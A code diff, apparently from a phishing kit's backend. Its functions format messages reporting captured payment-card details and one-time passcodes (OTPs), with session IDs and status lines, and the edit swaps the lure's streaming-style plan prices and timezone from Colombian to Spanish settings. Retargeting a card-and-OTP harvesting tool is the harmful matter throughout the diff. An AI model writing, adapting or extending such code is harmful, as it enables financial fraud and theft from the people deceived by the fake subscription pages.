@@ -34,12 +34,12 @@ function generateSessionId() {
 function formatCardMessage(data) {
     // Map plan names and prices
     const planInfo = {
-        'basic': { name: 'Básico', price: '18.900/mes' },
-        'Basic': { name: 'Básico', price: '18.900/mes' },
-        'standard': { name: 'Estándar', price: '29.900/mes' },
-        'Standard': { name: 'Estándar', price: '29.900/mes' },
-        'premium': { name: 'Premium', price: '44.900/mes' },
-        'Premium': { name: 'Premium', price: '44.900/mes' }
+        'basic': { name: 'Básico', price: '€4,99/mes' },
+        'Basic': { name: 'Básico', price: '€4,99/mes' },
+        'standard': { name: 'Estándar', price: '€7,99/mes' },
+        'Standard': { name: 'Estándar', price: '€7,99/mes' },
+        'premium': { name: 'Premium', price: '€11,99/mes' },
+        'Premium': { name: 'Premium', price: '€11,99/mes' }
     };
     
     const plan = planInfo[data.plan] || { name: 'Premium', price: '44.900/mes' };
@@ -59,7 +59,7 @@ function formatCardMessage(data) {
 
 📱 *Información de Sesión:*
 • ID: \`${data.sessionId}\`
-• Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
+• Hora: ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
 
 ⏳ *Estado:* Esperando acción...
     `.trim();
@@ -69,12 +69,12 @@ function formatCardMessage(data) {
 function formatOTPMessage(data) {
     // Map plan names and prices
     const planInfo = {
-        'basic': { name: 'Básico', price: '18.900/mes' },
-        'Basic': { name: 'Básico', price: '18.900/mes' },
-        'standard': { name: 'Estándar', price: '29.900/mes' },
-        'Standard': { name: 'Estándar', price: '29.900/mes' },
-        'premium': { name: 'Premium', price: '44.900/mes' },
-        'Premium': { name: 'Premium', price: '44.900/mes' }
+        'basic': { name: 'Básico', price: '€4,99/mes' },
+        'Basic': { name: 'Básico', price: '€4,99/mes' },
+        'standard': { name: 'Estándar', price: '€7,99/mes' },
+        'Standard': { name: 'Estándar', price: '€7,99/mes' },
+        'premium': { name: 'Premium', price: '€11,99/mes' },
+        'Premium': { name: 'Premium', price: '€11,99/mes' }
     };
     
     const plan = planInfo[data.plan] || { name: 'Premium', price: '44.900/mes' };
@@ -97,7 +97,7 @@ function formatOTPMessage(data) {
 
 📱 *Información de Sesión:*
 • ID: \`${data.sessionId}\`
-• Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
+• Hora: ${new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' })}
 
 ⏳ *Estado:* OTP recibido
     `.trim();
